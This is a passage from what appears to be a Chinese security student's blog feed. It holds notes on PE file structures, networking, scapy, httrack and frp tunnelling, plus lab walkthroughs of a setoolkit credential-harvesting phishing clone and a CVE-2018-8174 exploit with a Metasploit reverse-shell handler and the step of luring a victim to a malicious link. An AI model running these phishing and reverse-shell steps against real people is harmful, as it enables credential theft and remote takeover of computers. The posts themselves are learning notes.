&#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;</span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">    DWORD   AddressOfFunctions;     <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNames;         <span class="comment">// RVA from base of image</span></span><br><span class="line">    DWORD   AddressOfNameOrdinals;  <span class="comment">// RVA from base of image</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>具体每一项的含义如下：</p><ol><li>Characteristics：现在没有用到，一般为0。</li><li>TimeDateStamp：导出表生成的时间戳，由连接器生成。</li><li>MajorVersion，MinorVersion：看名字是版本，实际貌似没有用，都是0。</li><li>Name：模块的名字。</li><li>Base：序号的基数，按序号导出函数的序号值从Base开始递增。</li><li>NumberOfFunctions：所有导出函数的数量。</li><li>NumberOfNames：按名字导出函数的数量。</li><li>AddressOfFunctions：一个RVA，指向一个DWORD数组，数组中的每一项是一个导出函数的RVA，顺序与导出序号相同。</li><li>AddressOfNames：一个RVA，依然指向一个DWORD数组，数组中的每一项仍然是一个RVA，指向一个表示函数名字。</li><li>AddressOfNameOrdinals：一个RVA，还是指向一个WORD数组，数组中的每一项与AddressOfNames中的每一项对应，表示该名字的函数在AddressOfFunctions中的序号。</li></ol><h2 id="基址重定位"><a href="#基址重定位" class="headerlink" title="基址重定位"></a>基址重定位</h2><p>当链接器生成一个PE文件时，会装载到默认的基址下，把code和data的相关地址都写入PE文件。如果PE文件被装到虚拟内存的另一个地址中，链接器记录的就是错误的，需要重定位表来调整，用”.reloc”表示</p><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>Windows的各种界面叫做资源包括加速键(Accelerator)、位图(Bitmap)、光标(Cursor)、对话框(Dialog Box)、图标(Icon)、菜单(Menu)、串表(String Table)、工具栏(Toolbar)和版本信息(Version Information)等</p><p><code>资源目录结构</code><br>数据目录表中的 <code>IMAGE DIRECTORY ENTRY RESOURCE</code>条目(第三项)包含资源的RVA和大小。资源目录结构中的每一个节点都是由 <code>IMAGE RESOURCE DIRECTORY</code>结构和紧跟其后的数个 <code>IMAGE RESOURCE DIRECTORY ENTRY</code>结构组成的。</p><p><strong>IMAGE_RESOURCE_DIRECTORY</strong> 与 <strong>IMAGE_RESOURCE_DIRECTORY_ENTRY</strong> 结构体定义如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;      <span class="comment">//属性，一般为0</span></span><br><span class="line">    DWORD   TimeDateStamp;        <span class="comment">//资源的产生时刻，一般为0</span></span><br><span class="line">    WORD    MajorVersion;         <span class="comment">//主版本号，一般为0</span></span><br><span class="line">    WORD    MinorVersion;         <span class="comment">//次版本号，一般为0</span></span><br><span class="line">    WORD    NumberOfNamedEntries; <span class="comment">//以名称（字符串）命名的资源数量</span></span><br><span class="line">    WORD    NumberOfIdEntries;    <span class="comment">//以ID（整型数字）命名的资源数量</span></span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD NameOffset:<span class="number">31</span>;</span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        DWORD   Name;</span><br><span class="line">        WORD    Id;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   OffsetToData;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;</span><br><span class="line">            DWORD   DataIsDirectory:<span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure><h3 id="1-第一层"><a href="#1-第一层" class="headerlink" title="1. 第一层"></a>1. 第一层</h3><p> 第一层起始于一个 IMAGE_RESOURCE_DIRECTORY 头，后面紧接着是 IMAGE_RESOURCE_DIRECTORY_ENTRY 数组。<strong>数组个数</strong> = <strong>NumberOfNamedEntries</strong> + <strong>NumberOfIdEntries</strong>。</p><p>  IMAGE_RESOURCE_DIRECTORY_ENTRY 使用的是 Name 与 OffsetToDirectory，分别代表了资源类型与第二层的数据偏移地址。Name 与资源类型的匹配如下：</p>]]></content>
      
      
      <categories>
          
          <category> Re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Re </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>scapy使用</title>
      <link href="/2021/07/26/Linux%E5%AD%A6%E4%B9%A0/kali/scapy%E4%BD%BF%E7%94%A8/"/>
      <url>/2021/07/26/Linux%E5%AD%A6%E4%B9%A0/kali/scapy%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h1><p>该工具可以改包</p><p>使用ARP().display()</p><p>###[ ARP ]###<br>  hwtype= 0x1<br>  ptype= IPv4<br>  hwlen= None<br>  plen= None<br>  op= who-has<br>  hwsrc= 00:0c:29:b5:d7:1e<br>  psrc= 192.168.3.24<br>  hwdst= 00:00:00:00:00:00<br>  pdst= 0.0.0.0</p><p><code>sr1(ARP(pdst=&quot;192.168.3.1&quot;))</code></p><p>IP()和ICMP()可以生成ping包</p><p><code>sr1(IP(dst=&quot;192.168.3.1&quot;,src=&quot;192.168.3.26&quot;)/ICMP(),timeout=1)</code></p><p>tcp包</p><p>###[ TCP ]###<br>  sport= ftp_data<br>  dport= http<br>  seq= 0<br>  ack= 0<br>  dataofs= None<br>  reserved= 0<br>  flags= S #表示SYN<br>  window= 8192<br>  chksum= None<br>  urgptr= 0<br>  options= []</p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络层</title>
      <link href="/2021/07/25/Network/%E7%BD%91%E7%BB%9C%E5%B1%82/"/>
      <url>/2021/07/25/Network/%E7%BD%91%E7%BB%9C%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><p>遗留的问题</p><ol><li>可靠传输(不重复，不丢失，不失序)</li><li>不同网络建立连接</li></ol><h2 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h2><p><strong>虚电路</strong></p><p>计算机网络应模仿电信网络，使用面向连接的通信方式</p><p>虚电路只是逻辑上的连接 </p><p><strong>网络提供数据报服务</strong></p><p>无连接，</p><p>网络层不提供服务质量的承诺</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>拓展互联网</title>
      <link href="/2021/07/23/Network/%E6%8B%93%E5%B1%95%E4%BA%92%E8%81%94%E7%BD%91/"/>
      <url>/2021/07/23/Network/%E6%8B%93%E5%B1%95%E4%BA%92%E8%81%94%E7%BD%91/</url>
      
        <content type="html"><![CDATA[<h1 id="在物理层拓展以太网"><a href="#在物理层拓展以太网" class="headerlink" title="在物理层拓展以太网"></a>在物理层拓展以太网</h1><h2 id="使用光纤扩展"><a href="#使用光纤扩展" class="headerlink" title="使用光纤扩展"></a>使用光纤扩展</h2><p>主机使用光纤(通常是一对光纤)和一对光纤调制<br>解调器连接到集线器。<br>很容易使主机和几公里以外的集线器相连接。</p><h2 id="使用集线器扩展"><a href="#使用集线器扩展" class="headerlink" title="使用集线器扩展"></a>使用集线器扩展</h2><p>使用多个集线器可连成更大的、多级星形结构的以<br>太网。<br>例如,一个学院的三个系各有一个10 BASE-T以太<br>网,可通过一个主干集线器把各系的以太网连接起<br>来,成为一个更大的以太网。</p><p>级联</p><p>优点</p><ul><li><p>使原来属于不同碰撞域的以太网上的计算机能够进<br>行跨碰撞域的通信。</p></li><li><p>扩大了以太网覆盖的地理范围。</p></li></ul><p>缺点</p><ul><li>碰撞域增大了,但总的吞吐量并未提高。</li><li>如果不同的碰撞域使用不同的数据率,那么就不能<br>用集线器将它们互连起来。</li></ul><h2 id="在数据链路层拓展"><a href="#在数据链路层拓展" class="headerlink" title="在数据链路层拓展"></a>在数据链路层拓展</h2><p>扩展以太网更常用的方法是在数据链路层进行。<br>早期使用<strong>网桥</strong>,现在使用<strong>以太网交换机</strong>。</p><p>网桥工作在数据链路层。<br>它根据MAc帧的目的地址对收到的帧进行转发和过滤。<br>当网桥收到一个帧时,并不是向所有的接口转发此帧,而是<br>先检查此帧的目的MAC地址,然后再确定将该帧转发到哪<br>个接口,或把它丢弃。</p><p>1990年问世的交换式集线器( switching hub)可明显地提高以太网的性能。<br>交换式集线器常称为以太网交换机 (switch)或第二层交换机(L2 switch),强调这种交换机工作在数据链路层 </p><p>以太网交换机实质上就是一个多接口的网桥。通常都有十几个或更多的接口。<br>每个接口都直接与一个单台主机或另一个以太网交换机相连,并且一般都工作在全<strong>双工</strong>方式。<br>以太网交换机具有并行性。能同时连通多对接口,使多对主机能同时通信。<br><strong>相互通信的主机都是独占传输媒体,无碰撞地传输数据。</strong></p><p>以太网交换机的接口有<strong>存储器</strong>,能在输出端口繁忙时把到来的帧进行缓存。<br>以太网交换机是一种即插即用设备,其内部的帧交换表(又称为地址表)是通过自学习算法自动地逐渐建立起来的。<br>以太网交换机使用了专用的交换结构芯片,用硬件转发,其转发速率要比使用软件转发的网桥快很多。</p><p><code>以太网交换机的优点</code></p><p>对于普通10 Mbit/s的共享式以太网,若共有N个用户,则每个用户占有的平均带宽只有总带宽(10Mbs的N分之一。<br>使用以太网交换机时,虽然在每个接口到主机的带宽还是10Mbit/s,但由于一个用户在通信时是独占而不是和其他网络用户共享传输媒体的带宽，因此对于拥有N个接口的交换机的总容量为N×10Mbts。<br>从共享总线以太网转到交换式以太网时,所有接入设备的软件和硬件、适配器等都不需要做任何改动，以太网交换机一般都具有多种速率的接口,方便了各种不同情况的用户。</p><hr><h1 id="以太网的交换方式"><a href="#以太网的交换方式" class="headerlink" title="以太网的交换方式"></a>以太网的交换方式</h1><p><strong>存储转发方式</strong></p><p>把整个数据帧先缓存后再进行处理</p><p><strong>直通方式</strong></p><p>接收数据帧的同时就立即按数据帧的目的MAC地址决定该帧的转发接口,因而提高了帧的转发速度。<br>缺点是它不检查差错就直接将帧转发出去,因此有可能也将一些无效帧转发给其他的站。</p><h2 id="以太网交换机的自学习功能"><a href="#以太网交换机的自学习功能" class="headerlink" title="以太网交换机的自学习功能"></a>以太网交换机的自学习功能</h2><p>以太网交换机运行自学习算法自动维护<strong>交换表</strong>。</p><p>开始时,以太网交换机里面的交换表是空的。</p><h2 id="交换机-生成树协议STP"><a href="#交换机-生成树协议STP" class="headerlink" title="交换机 生成树协议STP"></a>交换机 生成树协议STP</h2><p>网络风暴</p><p>IEEE802.1D指定了生成树协议STP 从逻辑上切断某些链路，使得一台主机到所有其他路径是无环路的树状结构</p><h2 id="虚拟局域网"><a href="#虚拟局域网" class="headerlink" title="虚拟局域网"></a>虚拟局域网</h2><p>利用以太网交换机可以很方便实现虚拟局域网VLAN Virtual LAN</p><p>数据链路层划分VLAN</p><p>虚拟局域网限制了接收广播信息的工作站数，使得网络不会因传播过多的广播信息(广播风暴)而引起性能恶化</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网学习-数据链路层</title>
      <link href="/2021/07/23/Network/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/"/>
      <url>/2021/07/23/Network/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<h1 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h1><p>数据链路层使用的信道主要有两种类型：<br>点对点信道<br>广播信道：一对多<br>链路是一条无缘的点到点的物理线路段，中间没有任何其他的交换结点<br>数据链路(data link)除了物理线路外,还必须有通信协议来控制这些数据的传输。若把实现这些协议件和软件加到链路上，就构成了数据链路。<br>现在最常用的方法是使用适配器（即网卡）来实现这些协议的硬件和软件。<br>一般的适配器都包括了数据链路层和物理层这两层（网络接口层）的功能。<br>链路分为物理链路和逻辑链路<br>物理链路就是链路。逻辑链路就是物理链路加上通信协议</p><p><strong>数据链路层传送的是帧</strong></p><h2 id="封装成帧-framing"><a href="#封装成帧-framing" class="headerlink" title="封装成帧 framing"></a>封装成帧 framing</h2><p>首部和尾部就是进行帧定界<br><img src="https://img-blog.csdnimg.cn/20210401223548621.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxOTExNDMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="透明传输"><a href="#透明传输" class="headerlink" title="透明传输"></a><strong>透明传输</strong></h2><p>用帧的定界符<br>SOH表示开始，EOT表示结束<br>但在数据内部出现EOT则会把数据出错<br>解决方法：字节填充或字符填充<br>ESC 即转义字符</p><h2 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a><strong>差错控制</strong></h2><p>在一段时间内，传输错误的比特占所传输比特总数的比率称为误码率BER (Bit Error Rate)。<br>循环冗余检验CRC<br>冗余码计算<br>用二进制的模⒉运算进行2^n^乘M的运算，这相当于在M后面添加n个0。<br>得到的(k+n)位的数除以事先选定好的长度为(n +1)位的除数P得出商是Q而余数是R,余数R比除数Р少1位，即R是n位。<br>FCS<br>无比特差错和无传输差错不同<br>可靠传输： 不重复，不丢失，不失序 CRC做不到</p><h2 id="PPP协议"><a href="#PPP协议" class="headerlink" title="PPP协议"></a>PPP协议</h2><p> 满足的功能</p><ul><li>简单</li><li>封装成帧</li><li>透明性</li><li>多种网络层协议</li><li>多种类型链路</li><li>差错检测</li><li>检测连接状态</li><li>最大传送单元</li><li>网络层地址协商</li><li>数据压缩协商</li></ul><p>不需要的功能</p><ul><li>纠错 </li><li>流量控制</li><li> 序号</li><li> 多点线路 </li><li>半双工或单工链路</li></ul><p>ppp协议由三个组成部分：</p><ol><li>一个将ip数据报封装到串行链路的方法</li><li>链路控制协议 LCP（link Control Protocal）</li><li>网络控制协议 NCP （Network Control Protocal）</li></ol><h2 id="PPP协议的帧格式"><a href="#PPP协议的帧格式" class="headerlink" title="PPP协议的帧格式"></a>PPP协议的帧格式</h2><p>首部和尾部分别为四个字段和两个字段<br><img src="https://img-blog.csdnimg.cn/20210402172002789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxOTExNDMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>ppp协议在发送时将7E转化为7D5E 将7D 转化为7D5D<br>同步传输  ：当出现5个1 时会插0</p><h3 id="ppp不提供可靠传输"><a href="#ppp不提供可靠传输" class="headerlink" title="ppp不提供可靠传输"></a>ppp不提供可靠传输</h3><p>在数据链路层出现差错的概率不大时，使用比较简单的PPP协议较为合理。<br>在因特网环境下，PPP的信息字段放入的数据是IP数据报。数据链路层的可靠传输并不能够保证网络层的传输也是可靠的。<br>帧检验序列FCS字段可保证无差错接受。</p>]]></content>
      
      
      <categories>
          
          <category> Network </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>httrack克隆网站</title>
      <link href="/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/httrack/"/>
      <url>/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/httrack/</url>
      
        <content type="html"><![CDATA[<p>httrack可以克隆网站，将目标网站所有页面复制一份，httrack是专门针对web应用程序服务器进行探测，拷贝目标服务器到本地的主要作用是在探测尽量减少与目标主机产生交互</p><p>以下是具体操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to HTTrack Website Copier (Offline Browser) 3.49-2+libhtsjava.so.2</span><br><span class="line">Copyright (C) 1998-2017 Xavier Roche and other contributors</span><br><span class="line">To see the option list, enter a blank line or try httrack --help</span><br><span class="line"></span><br><span class="line">Enter project name :dvwa</span><br><span class="line"></span><br><span class="line">Base path (return=/root/websites/) :/root/dvwa </span><br><span class="line"></span><br><span class="line">Enter URLs (separated by commas or blank spaces) :http://192.168.3.27/dvwa</span><br><span class="line"></span><br><span class="line">Action:</span><br><span class="line">(enter) 1       Mirror Web Site(s) # 镜像网站</span><br><span class="line">        2       Mirror Web Site(s) with Wizard # 镜像网站 向导型</span><br><span class="line">        3       Just Get Files Indicated #指定镜像</span><br><span class="line">        4       Mirror ALL links in URLs (Multiple Mirror) # 镜像URL所有链接</span><br><span class="line">        5       Test Links In URLs (Bookmark Test) # 测试URL的所有链接</span><br><span class="line">        0       Quit</span><br><span class="line">: 2</span><br><span class="line"></span><br><span class="line">Proxy (return=none) :</span><br><span class="line"></span><br><span class="line">You can define wildcards, like: -*.gif +www.*.com/*.zip -*img_*.zip</span><br><span class="line">Wildcards (return=none) :*</span><br><span class="line"></span><br><span class="line">You can define additional options, such as recurse level (-r&lt;number&gt;), separated by blank spaces</span><br><span class="line">To see the option list, type help</span><br><span class="line">Additional options (return=none) :</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">---&gt;</span><span class="bash"> Wizard <span class="built_in">command</span> line: httrack http://192.168.3.27/dvwa -W -O <span class="string">&quot;/root/dvwa/dvwa&quot;</span>  -%v  *</span></span><br><span class="line"></span><br><span class="line">Ready to launch the mirror? (Y/n) :y</span><br><span class="line"></span><br><span class="line">WARNING! You are running this program as root!</span><br><span class="line">It might be a good idea to run as a different user</span><br><span class="line">Mirror launched on Thu, 22 Jul 2021 23:56:17 by HTTrack Website Copier/3.49-2+libhtsjava.so.2 [XR&amp;CO&#x27;2014]</span><br><span class="line">mirroring http://192.168.3.27/dvwa * with the wizard help..</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>setoolkit做钓鱼网站</title>
      <link href="/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/setoolkit/"/>
      <url>/2021/07/22/Linux%E5%AD%A6%E4%B9%A0/kali/setoolkit/</url>
      
        <content type="html"><![CDATA[<p>setoolkit是个社工工具</p><p> Select from the menu:</p><ol><li><p>Social-Engineering Attacks 社会工程攻击</p></li><li><p>Penetration Testing (Fast-Track) 渗透测试(快速通道)</p></li><li><p>Third Party Modules 第三方模块</p></li><li><p>Update the Social-Engineer Toolkit 更新社会工程师工具包</p></li><li><p>Update SET configuration 更新set设置</p></li><li><p>Help, Credits, and About 帮助，积分和关于</p></li><li><p>Exit the Social-Engineer Toolkit 退出</p></li></ol><p>我们选1</p><ol><li>Spear-Phishing Attack Vectors 钓鱼攻击载体<ol start="2"><li>Website Attack Vectors 网站攻击载体</li><li>Infectious Media Generator  传染性媒体生成器</li><li>Create a Payload and Listener 创建一个有效载荷和听众</li><li>Mass Mailer Attack 邮件群发攻击</li><li>Arduino-Based Attack Vector 基于Arduino的攻击载体</li><li>Wireless Access Point Attack Vector 无线接入点攻击载体</li><li>QRCode Generator Attack Vector QRC代码生成器攻击向量</li><li>Powershell Attack Vectors Powershell攻击载体</li></ol></li><li>Third Party Modules 第三方模块</li></ol><p>我们选2</p><ol><li>Java Applet Attack Method</li><li>Metasploit Browser Exploit Method</li><li>Credential Harvester Attack Method</li><li>Tabnabbing Attack Method</li><li>Web Jacking Attack Method</li><li>Multi-Attack Web Method</li><li>HTA Attack Method</li></ol><p>我们选3</p><ol><li>Web Templates</li><li>Site Cloner</li><li>Custom Import</li></ol><p>我们选2</p><p>监听为本机 直接回车</p><p>输入要监听的网站</p><p><a href="http://192.168.3.27/dvwa">http://192.168.3.27/dvwa</a></p><p>访问192.168.3.24</p><p>可以看到DVWA页面输入密码发现又出现同样的页面其实域名已经变了再输入一次</p><p>返回setoolkit发现已经得到了账号密码</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/kali/setoolkit/s1.png"></p>]]></content>
      
      
      <categories>
          
          <category> kali </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-8174 漏洞复现</title>
      <link href="/2021/07/22/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/07/22/web%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/CVE-2018-8174%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="利用0DAY漏洞CVE-2018-8174获取shell"><a href="#利用0DAY漏洞CVE-2018-8174获取shell" class="headerlink" title="利用0DAY漏洞CVE-2018-8174获取shell"></a>利用0DAY漏洞CVE-2018-8174获取shell</h1><p>CVE 2018 8174 漏洞影响最新版本的 IE 浏览器及使用了 IE 内核的应用程序。用户在浏览网页或打开 Office 文档时都可能中招，最终被黑客植入后门木马完全控制电脑。微软在 2 018 年 4 月 20 日早上确认此漏洞，并于 2018 年 5 月 8 号发布了官方安全补丁，对该 0day 漏洞进行了修复，并将其命名为CVE-2018-8174</p><p>上传CVE-2018-8174_EXP master.zip</p><p>unzip CVE-2018-8174_EXP master.zip</p><p>cd</p><p>python CVE-2018-8174.py -u <a href="http://192.168.3.24/exploit.html">http://192.168.3.24/exploit.html</a> -o hack.rtf -i 192.168.3.24 -p 4444</p><p><code>-u url地址  -o生成文档 -i监听地址 -p 监听端口</code></p><p>cp exploit.html /var/www/</p><p>启动万能的msf</p><blockquote><p>use exploit/multi/handler</p><p>exploit(multi/handler) &gt; set payload w indows/shell/reverse_tcp</p><p>run</p></blockquote><p>让受害者点击恶意链接</p><p><a href="http://192.168.3.24/exploit.html">http://192.168.3.24/exploit.html</a></p><p>获得最高权限</p><p>好水……</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> msf </tag>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>frp内网穿透</title>
      <link href="/2021/07/21/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>/2021/07/21/web%E5%AE%89%E5%85%A8/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-内网发布服务在公网访问"><a href="#1-内网发布服务在公网访问" class="headerlink" title="1.内网发布服务在公网访问"></a>1.内网发布服务在公网访问</h1><h2 id="服务器对外发布服务原理"><a href="#服务器对外发布服务原理" class="headerlink" title="服务器对外发布服务原理"></a>服务器对外发布服务原理</h2><p>内网主机是用一个ip进行上网的，那么如何让互联网其他主机访问我的内网主机呢？</p><p>分析NET工作过程可以得知整个过程进行两次ip地址转换。</p><p>第一次请求包的源ip地址源地址转化称为SNAT<code>其中S表示source|源 </code>。</p><p>第二次转换答应包的目的地址也被称为目的地址转换DNAT<code>D表示Destination|目的地</code>，DNAT转换可以使互联网访问到内网的主机,单独配置DNAT就可以实现访问内网主机啦！</p><p><strong>通过端口映射发布服务的方式：</strong></p><p>端口映射是比较灵活的映射内网各个不同主机的方式，需要对外发布的服务端口，端口映射的配置方式也比较简单，一般情况可通过路由器配置，但是通过路由器配置端口映射需要有一个前提条件，就是你路由器能够拥有一个公网IP，按正常逻辑来说我们路由器拨号成功后运营商会分配一个公网IP给路由器，但是对于运营商来说这样对IPv4的资源也是种负担，如果每个人都有一个公网IP ，那么国内的IPv4资源将会非常紧张，我 国总计约有 3 亿个IPv4地址，而我国网民何止3亿。所以运营商会在路由器拨号中再嵌套一层内网，也就是说我们路由器拨号得到的IP地址也是一个内网地址，然后由运营商的路由网关再做NAT地址转换进行上网。</p><p>查看是否有公网地址 登录网关查看WAN IP地址</p><p>我家里不是 枯了</p><p><strong>下面操作只是理论没有实操</strong></p><p>查看kali的Mac地址</p><p><strong>添加映射规则：</strong><br>端口，这里不推荐大家在外部端口使用 8 0 端口，因为默认运营商会封杀 8 0 端口，建议使用 1 000 以上<br>的端口号。</p><p><img src="https://raw.githubusercontent.com/Phantomor/images/main/img/net/frp/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/f1.png"></p><p>访问公网地址+端口号</p><p>这样我们就能用公网访问内网啦</p><h2 id="无公网IP配置端口映射"><a href="#无公网IP配置端口映射" class="headerlink" title="无公网IP配置端口映射"></a>无公网IP配置端口映射</h2><p>这需要借助第三方服务花生壳</p><p>但要买域名</p><p>终止</p><h1 id="2-Frp搭建内网穿透服务器"><a href="#2-Frp搭建内网穿透服务器" class="headerlink" title="2.Frp搭建内网穿透服务器"></a>2.Frp搭建内网穿透服务器</h1><h2 id="2-1-内网穿透的使用场景"><a href="#2-1-内网穿透的使用场景" class="headerlink" title="2.1.内网穿透的使用场景"></a>2.1.内网穿透的使用场景</h2><p>内网穿透从本质上来讲也是端口映射，两者都是将内网地址映射到公网可访问的地址，而区别是端口映射直接在路由器中配置即可，而内网穿透配置的端口映射则需要客户端和服务端进行绑定后实现，相当于客户端和服务端之间建立了一条隧道，然后访问服务端的请求会通过隧道转发给内网主机，该情况多用于没有公网IP的情况下使用。</p><h2 id="2-2安装配置-frp-服务器映射内网-SSH-服务"><a href="#2-2安装配置-frp-服务器映射内网-SSH-服务" class="headerlink" title="2.2安装配置 frp 服务器映射内网 SSH 服务"></a>2.2安装配置 frp 服务器映射内网 SSH 服务</h2><p>需要台服务器</p><p>下载frp_amd64.tar.gz</p><p>tar xf frp_0.37.0_linux_amd64.tar.gz</p><p>frpc  客户端程序<br>frpc_full.ini  客户端完整配置文件<br>frpc.ini  客户端简易配置文件<br>frps  服务端程序<br>frps _full.ini 服务端完整配置文件<br>frps .ini 服务端简易配置文件</p><p>启动服务端<br>查看配置文件内容。仅配置了侦听端口7000 ，这是服务端和客户端通讯的端口。</p><p>[common]<br>bind_port = 7000</p><p>./frps -c ./frps.ini</p><p>在本地 kali 启动客户端<br>tar xf frp_0.37.0_linux_amd64.tar.gz</p><p>cd frp_0.37.0_linux_amd64/</p><p>vim frpc.ini<br>[common]<br>server_addr = xxx 修改 server 地址为云主机公网 I P<br>server_port = 7000<br>[ssh]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 22<br>remote_port = 6000</p><p>common配置指定了服务端 I P 地址和端口，这样客户端可以和服务端之间建立通讯。<br>ssh配置中指定了协议为 tcp ，本地 IP 127.0.0.1 本地端口： 22 ，映射到服务端端口 6 000如果配置成功访问云主机公网 IP 的 6000 端口表示远程登录到我们内网 kali 主机 22 端口。</p><p>./frps -c 